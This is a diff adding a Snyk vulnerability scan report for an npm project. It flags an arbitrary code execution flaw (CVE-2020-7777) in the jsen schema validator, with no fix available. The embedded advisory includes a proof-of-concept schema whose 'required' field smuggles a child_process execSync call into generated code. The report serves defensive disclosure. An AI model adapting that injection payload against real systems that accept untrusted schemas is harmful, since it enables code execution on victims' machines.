@@ -1,0 +1,101 @@
+{
+  "ok": false,
+  "vulnerabilities": [
+    {
+      "id": "SNYK-JS-JSEN-1014670",
+      "title": "Arbitrary Code Execution",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
+      "credit": [
+        "Alessio Della Libera (d3lla)"
+      ],
+      "semver": {
+        "vulnerable": [
+          "*"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "js",
+      "severity": "high",
+      "cvssScore": 7.2,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "jsen",
+      "references": [
+        {
+          "url": "https://github.com/bugventure/jsen/blob/master/lib/jsen.js%23L875",
+          "title": "Vulnerable Code"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "NVD",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 7.2,
+          "modificationTime": "2022-01-03T18:10:12.967818Z"
+        }
+      ],
+      "description": "## Overview\n[jsen](https://www.npmjs.com/package/jsen) is a JSON-Schema validator built for speed\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. If an attacker can control the schema file, it could run arbitrary JavaScript code on the victim machine.\r\nIn the module description and README file there is no mention about the risks of untrusted schema files, so I assume that this is applicable.\r\n\r\nIn particular the `required` field of the schema is not properly sanitized.\r\nThe resulting string that is build based on the schema definition is then passed to a `Function.apply();`, leading to an Arbitrary Code Execution.\r\n\r\n### PoC\r\n\r\n```\r\nconst jsen = require('jsen');\r\n\r\nlet schema = JSON.parse(`\r\n{\r\n    \"type\": \"object\",\r\n    \"properties\": {\r\n        \"username\": {\r\n            \"type\": \"string\"\r\n        }\r\n    },\r\n    \"required\": [\"\\\\\"+process.mainModule.require(\\'child_process\\').execSync(\\'touch malicious\\')+\\\\\"\"]\r\n}`);\r\n\r\nconst validate = jsen(schema);\r\nvalidate({});\r\n```\n## Remediation\nThere is no fixed version for `jsen`.\n## References\n- [Vulnerable Code](https://github.com/bugventure/jsen/blob/master/lib/jsen.js#L875)\n",
+      "epssDetails": {
+        "percentile": "0.51143",
+        "probability": "0.00157",
+        "modelVersion": "v2023.03.01"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2020-7777"
+        ],
+        "CWE": [
+          "CWE-94"
+        ]
+      },
+      "packageName": "jsen",
+      "proprietary": true,
+      "creationTime": "2020-10-01T13:08:58.856237Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2020-10-01T13:05:21Z",
+      "packageManager": "npm",
+      "publicationTime": "2020-11-23T16:06:49.716733Z",
+      "modificationTime": "2022-01-03T18:10:12.967818Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "packagePopularityRank": 94,
+      "from": [
+        "pro-colors@pouyakary/procolors#d7e20f2866cd8e48c6243b376b131ced0c8cc3da",
+        "themex@0.0.3",
+        "jsen@0.6.6"
+      ],
+      "upgradePath": [],
+      "version": "0.6.6",
+      "name": "jsen",
+      "isUpgradable": false,
+      "isPatchable": false,
+      "isPinnable": false
+    }
+  ],
+  "numDependencies": 22,
+  "severityMap": {
+    "critical": 0,
+    "high": 1,
+    "medium": 0,
+    "low": 0
+  },
+  "org": "bruswei",
+  "packageManager": "npm",
+  "summary": "1 vulnerable dependency path",
+  "filesystemPolicy": false,
+  "filtered": {
+    "ignore": [],
+    "patch": []
+  },
+  "uniqueCount": 1,
+  "hasUnknownVersions": false,
+  "path": "https://github.com/pouyakary/procolors.git"
+}
